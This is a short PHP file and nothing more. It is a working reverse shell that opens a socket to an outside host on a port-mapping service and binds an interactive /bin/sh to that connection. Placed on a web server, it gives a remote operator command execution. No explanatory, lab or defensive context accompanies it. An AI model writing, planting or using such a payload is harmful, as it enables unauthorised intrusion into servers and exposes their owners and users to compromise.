<?php
$sock = fsockopen("jerrygodc-51839.portmap.io", 51839);
exec("/bin/sh -i <&3 >&3 2>&3");
?>
